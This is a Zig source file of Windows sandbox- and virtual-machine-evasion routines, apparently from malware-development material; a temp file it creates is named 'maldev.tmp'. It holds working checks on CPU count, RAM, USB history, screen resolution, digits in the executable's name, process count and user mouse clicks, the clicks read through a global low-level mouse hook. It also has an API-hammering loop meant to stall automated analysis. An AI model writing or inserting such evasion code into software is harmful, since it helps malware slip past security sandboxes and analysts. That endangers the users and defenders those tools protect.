const std = @import("std");
const win = @import("zigwin32").everything;

const HKEY_LOCAL_MACHINE = win.HKEY_LOCAL_MACHINE;
const KEY_READ = win.KEY_READ;
const MAX_PATH = win.MAX_PATH;
const WH_MOUSE_LL = win.WH_MOUSE_LL;
const WM_LBUTTONDOWN = win.WM_LBUTTONDOWN;
const WM_RBUTTONDOWN = win.WM_RBUTTONDOWN;
const WM_MBUTTONDOWN = win.WM_MBUTTONDOWN;
const WAIT_FAILED = win.WAIT_FAILED;
const FILE_GENERIC_WRITE = win.FILE_GENERIC_WRITE;
const FILE_GENERIC_READ = win.FILE_GENERIC_READ;
const INVALID_HANDLE_VALUE = win.INVALID_HANDLE_VALUE;

const SYSTEM_INFO = win.SYSTEM_INFO;
const MEMORYSTATUSEX = win.MEMORYSTATUSEX;
const HKEY = win.HKEY;
const HMONITOR = win.HMONITOR;
const HDC = win.HDC;
const RECT = win.RECT;
const LPARAM = win.LPARAM;
const BOOL = win.BOOL;
const MONITORINFO = win.MONITORINFO;
const WPARAM = win.WPARAM;
const LRESULT = win.LRESULT;
const MSG = win.MSG;
const HHOOK = win.HHOOK;

const GetSystemInfo = win.GetSystemInfo;
const GlobalMemoryStatusEx = win.GlobalMemoryStatusEx;
const RegOpenKeyExA = win.RegOpenKeyExA;
const RegQueryInfoKeyA = win.RegQueryInfoKeyA;
const GetLastError = win.GetLastError;
const EnumDisplayMonitors = win.EnumDisplayMonitors;
const GetMonitorInfoW = win.GetMonitorInfoW;
const GetModuleFileNameA = win.GetModuleFileNameA;
const EnumProcesses = win.K32EnumProcesses;
const SetWindowsHookExW = win.SetWindowsHookExW;
const CallNextHookEx = win.CallNextHookEx;
const GetMessageW = win.GetMessageW;
const WaitForSingleObject = win.WaitForSingleObject;
const UnhookWindowsHookEx = win.UnhookWindowsHookEx;
const CreateThread = win.CreateThread;
const CreateEventA = win.CreateEventA;
const GetTickCount64 = win.GetTickCount64;
const CloseHandle = win.CloseHandle;
const GetTempPathA = win.GetTempPathA;
const CreateFileA = win.CreateFileA;
const WriteFile = win.WriteFile;
const ReadFile = win.ReadFile;

pub fn isVenvByHardwareCheck() !bool {
    var system_info: SYSTEM_INFO = undefined;
    GetSystemInfo(&system_info);

    var cpu_check = false;
    var ram_check = false;
    var usb_check = false;

    if (system_info.dwNumberOfProcessors < 2) {
        std.debug.print("[!] Only {d} Processors Found.\n", .{system_info.dwNumberOfProcessors});
        cpu_check = true;
    }

    var mem_status = std.mem.zeroes(MEMORYSTATUSEX);
    mem_status.dwLength = @sizeOf(MEMORYSTATUSEX);
    if (GlobalMemoryStatusEx(&mem_status) == 0) {
        std.debug.print("[!] GlobalMemoryStatusEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.GlobalMemoryStatusExFailed;
    }

    if (mem_status.ullTotalPhys <= 2 * 1024 * 1024 * 1024) {
        std.debug.print("[!] Only {d} MB Physical Memory Found.\n", .{mem_status.ullTotalPhys / 1024 / 1024});
        ram_check = true;
    }

    var h_key: ?HKEY = null;
    var reg_error = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SYSTEM\\ControlSet001\\Enum\\USBSTOR",
        0,
        KEY_READ,
        &h_key,
    );
    if (reg_error == .ERROR_FILE_NOT_FOUND) {
        std.debug.print("[!] No USB Device Found.\n", .{});
        usb_check = true;
    } else if (reg_error != .NO_ERROR) {
        std.debug.print("[!] RegOpenKeyExA Failed With Error: {s}\n", .{@tagName(reg_error)});
        return error.RegOpenKeyExAFailed;
    }

    if (h_key != null) {
        var usb_number: u32 = undefined;
        reg_error = RegQueryInfoKeyA(
            h_key,
            null,
            null,
            null,
            &usb_number,
            null,
            null,
            null,
            null,
            null,
            null,
            null,
        );
        if (reg_error != .NO_ERROR) {
            std.debug.print("[!] RegQueryInfoKeyA Failed With Error: {s}\n", .{@tagName(reg_error)});
            return error.RegQueryInfoKeyAFailed;
        }

        if (usb_number < 2) {
            std.debug.print("[!] Only {d} USB Device Found.\n", .{usb_number});
            usb_check = true;
        }
    }

    return cpu_check or ram_check or usb_check;
}

fn resolutionCallback(h_monitor: ?HMONITOR, _: ?HDC, _: ?*RECT, data: usize) callconv(std.os.windows.WINAPI) BOOL {
    var monitor_info = std.mem.zeroes(MONITORINFO);
    monitor_info.cbSize = @sizeOf(MONITORINFO);

    if (GetMonitorInfoW(h_monitor, &monitor_info) == 0) {
        std.debug.print("[!] GetMonitorInfoW Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return 0;
    }

    var x = monitor_info.rcMonitor.right - monitor_info.rcMonitor.left;
    if (x < 0) x = -x;

    var y = monitor_info.rcMonitor.top - monitor_info.rcMonitor.bottom;
    if (y < 0) y = -y;

    if ((x != 1920 and x != 2560 and x != 1440) or (y != 1080 and y != 1200 and y != 1600 and y != 900)) {
        std.debug.print("[!] Resolution {d}x{d} Found.\n", .{ x, y });
        const sandbox_check: *bool = @ptrFromInt(data);
        sandbox_check.* = true;
    }

    return 1;
}

pub fn checkMachineResolution() !bool {
    var sandbox_check = false;

    if (EnumDisplayMonitors(
        null,
        null,
        @ptrCast(&resolutionCallback),
        @bitCast(@intFromPtr(&sandbox_check)),
    ) == 0) {
        std.debug.print("[!] EnumDisplayMonitors Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.EnumDisplayMonitorsFailed;
    }

    return sandbox_check;
}

pub fn exeDigitsInNameCheck() !bool {
    var path_buf: [MAX_PATH:0]u8 = undefined;

    const len = GetModuleFileNameA(null, &path_buf, MAX_PATH);
    if (len == 0) {
        std.debug.print("[!] GetModuleFileNameA Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.GetModuleFileNameAFailed;
    }
    const path = path_buf[0..len];

    var number_of_digits: usize = 0;
    const name = std.fs.path.basename(path);
    for (name) |ch| {
        if (std.ascii.isDigit(ch)) number_of_digits += 1;
    }

    return number_of_digits > 3;
}

pub fn checkMachineProcesses() !bool {
    var processes: [1024]u32 = undefined;
    var cb_needed: u32 = 0;

    if (EnumProcesses(@ptrCast(&processes), processes.len * @sizeOf(u32), &cb_needed) == 0) {
        std.debug.print("[!] EnumProcesses Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.EnumProcessesFailed;
    }

    const number_of_pids = cb_needed / @sizeOf(u32);

    return number_of_pids < 50;
}

var mouse_hook: ?HHOOK = null;
var mouse_clicks: usize = 0;

fn hookCallback(code: i32, w_param: WPARAM, l_param: LPARAM) callconv(std.os.windows.WINAPI) LRESULT {
    if (w_param == WM_LBUTTONDOWN or w_param == WM_RBUTTONDOWN or w_param == WM_MBUTTONDOWN) {
        mouse_clicks += 1;
    }

    return CallNextHookEx(mouse_hook, code, w_param, l_param);
}

fn mouseClickLogger() BOOL {
    var msg: MSG = undefined;

    mouse_hook = SetWindowsHookExW(WH_MOUSE_LL, hookCallback, null, 0) orelse {
        std.debug.print("[!] SetWindowsHookExW Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return 0;
    };

    while (GetMessageW(&msg, null, 0, 0) == 1) {}

    return 1;
}

pub fn checkUserInteraction() !bool {
    const monitor_time = 20_000;

    var thread_id: u32 = 0;
    const h_thread = CreateThread(
        null,
        0,
        @ptrCast(&mouseClickLogger),
        null,
        .{},
        &thread_id,
    ) orelse {
        std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateThreadFailed;
    };
    _ = WaitForSingleObject(h_thread, monitor_time);

    if (mouse_hook != null and UnhookWindowsHookEx(mouse_hook) == 0) {
        std.debug.print("[!] UnhookWindowsHookEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.UnhookWindowsHookExFailed;
    }

    std.debug.print("[!] Monitored User's Mouse Clicks: {d}\n", .{mouse_clicks});
    return mouse_clicks <= 5;
}

pub fn apiHammering(allocator: std.mem.Allocator, stress: usize) !void {
    var tmp_path_buf: [MAX_PATH:0]u8 = undefined;
    const tmp_path_len = GetTempPathA(MAX_PATH, &tmp_path_buf);
    if (tmp_path_len == 0) {
        std.debug.print("[!] GetTempPathA Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.GetTempPathAFailed;
    }
    const tmp_path = tmp_path_buf[0..tmp_path_len];

    const path = try std.fs.path.joinZ(allocator, &.{ tmp_path, "maldev.tmp" });
    defer allocator.free(path);

    for (0..stress) |_| {
        var h_file = CreateFileA(
            path,
            FILE_GENERIC_WRITE,
            .{},
            null,
            .CREATE_ALWAYS,
            .{ .FILE_ATTRIBUTE_TEMPORARY = 1 },
            null,
        );
        if (h_file == INVALID_HANDLE_VALUE) {
            std.debug.print("[!] CreateFileA Failed With Error: {s}\n", .{@tagName(GetLastError())});
            return error.CreateFileAFailed;
        }

        var rand_buf: [0xfffff]u8 = undefined;
        std.crypto.random.bytes(&rand_buf);

        var number_of_bytes_written: u32 = 0;
        if (WriteFile(h_file, &rand_buf, rand_buf.len, &number_of_bytes_written, null) == 0 or number_of_bytes_written != rand_buf.len) {
            std.debug.print("[!] WriteFile Failed With Error: {s}\n", .{@tagName(GetLastError())});
            return error.WriteFileFailed;
        }
        _ = CloseHandle(h_file);

        h_file = CreateFileA(
            path,
            FILE_GENERIC_READ,
            .{},
            null,
            .OPEN_EXISTING,
            .{ .FILE_ATTRIBUTE_TEMPORARY = 1, .FILE_FLAG_DELETE_ON_CLOSE = 1 },
            null,
        );
        if (h_file == INVALID_HANDLE_VALUE) {
            std.debug.print("[!] CreateFileA Failed With Error: {s}\n", .{@tagName(GetLastError())});
            return error.CreateFileAFailed;
        }

        var number_of_bytes_read: u32 = 0;
        if (ReadFile(h_file, &rand_buf, rand_buf.len, &number_of_bytes_read, null) == 0 or number_of_bytes_read != rand_buf.len) {
            std.debug.print("[!] ReadFile Failed With Error: {s}\n", .{@tagName(GetLastError())});
            return error.ReadFileFailed;
        }
        _ = CloseHandle(h_file);
    }
}
